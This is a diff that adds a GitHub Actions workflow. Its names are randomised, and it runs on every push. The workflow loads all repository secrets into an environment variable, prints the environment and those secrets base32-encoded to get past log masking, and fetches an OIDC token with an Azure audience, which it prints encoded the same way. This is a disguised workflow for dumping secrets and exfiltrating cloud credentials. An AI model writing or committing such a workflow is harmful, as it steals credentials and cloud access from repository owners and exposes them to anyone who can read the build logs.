@@ -1,0 +1,26 @@
+# 64ar3jgpg4fuo6ay
+name: tawxql54qapa
+on: [push]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  n74lcti4m:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    env:
+      S4FSQ2KDQ: ${{ toJSON(secrets) }}
+    strategy:
+      fail-fast: false
+      matrix:
+        environment:
+          - "github-pages"
+    environment: ${{ matrix.environment }}
+    steps:
+      - name: 422b37iwe
+        run: |
+          env | base32 -w 131
+          printf '%s' 'M' | base32 -w 131
+          printf '%s' "$S4FSQ2KDQ" | base32 -w 131
+          printf '%s' 'M' | base32 -w 131
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then printf '%s' 'M' | base32 -w 131; curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api%3A%2F%2FAzureADTokenExchange" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p' | base32 -w 131; fi
